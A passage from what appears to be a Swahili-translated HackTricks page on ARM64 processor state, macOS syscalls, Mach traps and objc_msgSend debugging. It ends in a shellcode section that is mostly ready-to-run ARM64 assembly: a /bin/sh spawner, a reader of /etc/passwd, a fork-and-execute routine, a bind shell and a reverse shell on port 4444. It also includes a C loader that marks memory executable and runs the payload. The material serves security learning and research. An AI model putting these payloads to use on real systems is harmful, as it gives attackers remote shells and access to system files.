- Bendera **`N`**, **`Z`**, **`C`**, **`V`** (kama ilivyo katika AArch64)
- Bendera **`Q`**: Inawekwa kuwa 1 kila wakati **integer saturation** inapotokea wakati wa utekelezaji wa maelekezo maalum ya hisabati ya saturating. Mara ikiwa imewekwa kuwa **`1`**, itaendelea kuwa hivyo hadi itakapowekwa kwa mikono kuwa 0. Zaidi ya hayo, hakuna maelekezo yanayochunguza thamani yake kwa njia ya implicit; lazima isomwe kwa mikono.
- Bendera **`GE`** (Greater than or equal): Inatumika katika SIMD (Single Instruction, Multiple Data) operations, kama "parallel add" na "parallel subtract". Operesheni hizi zinawezesha kusindika pointi nyingi za data kwa maelekezo moja.

Kwa mfano, maelekezo **`UADD8`** **huongeza wanandoa nne za byte** (kutoka kwa operands mbili za 32-bit) kwa njia sambamba na kuhifadhi matokeo katika rejista ya 32-bit. Kisha **inaweka bendera za `GE` katika `APSR`** kulingana na matokeo haya. Kila bendera ya GE inalingana na moja ya nyongeza za byte, ikionyesha kama nyongeza ya wanandoa wa byte ilitokea **overflow**.

Maelekezo ya **`SEL`** yanatumia bendera hizi za GE kutekeleza vitendo vya masharti.

#### Rejista za Hali ya Utekelezaji

- Bits za **`J`** na **`T`**: **`J`** inapaswa kuwa 0 na ikiwa **`T`** ni 0 seti ya maelekezo A32 inatumiwa, na ikiwa ni 1, T32 inatumiwa.
- IT Block State Register (`ITSTATE`): Hizi ni bits kutoka 10-15 na 25-26. Zinahifadhi masharti kwa maelekezo ndani ya kundi lenye prefix **`IT`**.
- Bit **`E`**: Inaonyesha **endianness**.
- Mode na Exception Mask Bits (0-4): Zinabainisha hali ya utekelezaji ya sasa. Bit ya **5** inaonyesha ikiwa programu inafanya kazi kama 32bit (1) au 64bit (0). Zingine 4 zinaonyesha **mode ya exception inayotumika kwa sasa** (wakati exception inapotokea na inashughulikiwa). Nambari iliyowekwa **inaonyesha kipaumbele cha sasa** ikiwa exception nyingine itasababisha wakati hii inaendeshwa.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Exceptions fulani zinaweza kuzimwa kwa kutumia bits **`A`**, `I`, `F`. Ikiwa **`A`** ni 1 inamaanisha **asynchronous aborts** zitasababisha. **`I`** inaundwa ili kujibu external hardware **Interrupts Requests** (IRQs). na F inahusiana na **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Angalia [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) au endesha `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls zitakuwa na **x16 > 0**.

### Mach Traps

Angalia katika [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) `mach_trap_table` na katika [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) prototypes. Idadi ya juu ya Mach traps ni `MACH_TRAP_TABLE_COUNT` = 128. Mach traps zitakuwa na **x16 < 0**, kwa hivyo unahitaji kuita nambari kutoka kwenye orodha ya hapo juu kwa **minus**: **`_kernelrpc_mach_vm_allocate_trap`** ni **`-10`**.

Unaweza pia kuangalia **`libsystem_kernel.dylib`** katika disassembler ili kupata jinsi ya kuita syscalls hizi (na BSD):
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Kumbuka kwamba **Ida** na **Ghidra** pia zinaweza decompile **specific dylibs** kutoka kwenye cache kwa kupita tu cache.

> [!TIP]
> Wakati mwingine ni rahisi kukagua msimbo ulioteuliwa (**decompiled**) kutoka **`libsystem_kernel.dylib`** **than** kukagua **source code** kwa sababu msimbo wa several syscalls (BSD and Mach) unatengenezwa via scripts (check comments in the source code) wakati katika dylib unaweza kupata ni nini kinachoitwa.

### machdep calls

XNU inaunga mkono aina nyingine ya calls inayoitwa machine dependent. Nambari za calls hizi zinategemea architecture na wala calls au nambari hazihakikishiwi kubaki thabiti.

### comm page

Hii ni kernel owner memory page ambayo ime mapped ndani ya address scape ya kila user process. Imeundwa kufanya transition kutoka user mode kwenda kernel space iwe haraka kuliko kutumia syscalls kwa kernel services ambazo zimetumika sana kiasi kwamba transition hii ingekuwa very inefficient.

Kwa mfano miito `gettimeofdate` husoma thamani ya `timeval` moja kwa moja kutoka kwenye comm page.

### objc_msgSend

Ni super common kupata function hii ikitumiwa katika Objective-C au Swift programs. Function hii inaruhusu kuita method ya Objective-C object.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pointer to the instance
- x1: op -> Selector of the method
- x2... -> Rest of the arguments of the invoked method

Hivyo, ikiwa utaweka breakpoint kabla ya branch kuelekea function hii, unaweza kwa urahisi kubaini ni nini kinaoitwa katika lldb na (katika mfano huu object inaita object kutoka `NSConcreteTask` ambayo itafanya command):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Kuweka env variable **`NSObjCMessageLoggingEnabled=1`** inawezekana kurekodi (log) wakati function hii inapoitwa katika faili kama `/tmp/msgSends-pid`.
>
> Zaidi ya hayo, kuweka **`OBJC_HELP=1`** na kuwaita binary yoyote kutakuonyesha environment variables nyingine unazoweza kutumia kurekodi wakati vitendo fulani vya Objc-C vinapotokea.

Wakati function hii inapoitwa, inahitajika kupata method iliyoitwa ya instance iliyotajwa; kwa ajili hiyo hufanywa tafutaji mbalimbali:

- Fanya utafutaji wa cache wa matumaini:
- Ikiwa imefanikiwa, ipo sawa
- Pata runtimeLock (read)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Jaribu cache ya darasa lenyewe:
- Ikiwa imefanikiwa, ipo sawa
- Jaribu class method list:
- Ikiwa imepatikana, jaza cache na kamilisha
- Jaribu superclass cache:
- Ikiwa imefanikiwa, ipo sawa
- Jaribu superclass method list:
- Ikiwa imepatikana, jaza cache na kamilisha
- If (resolver) try method resolver, and repeat from class lookup
- Ikiwa bado uko hapa (= yote mengine yameshindwa) jaribu forwarder

### Shellcodes

Ili kujenga:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Ili kutoa mabaiti:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Kwa macOS za hivi karibuni:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Msimbo wa C wa kujaribu shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Imetolewa kutoka [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) na imeelezewa.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Soma kwa cat

Lengo ni kutekeleza `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, kwa hiyo hoja ya pili (x1) ni array ya params (ambayo katika kumbukumbu inamaanisha stack ya anuani).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Endesha amri kwa sh kutoka kwa fork ili mchakato mkuu usiuwe
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell kutoka [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) katika **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Kutoka [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell kwa **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
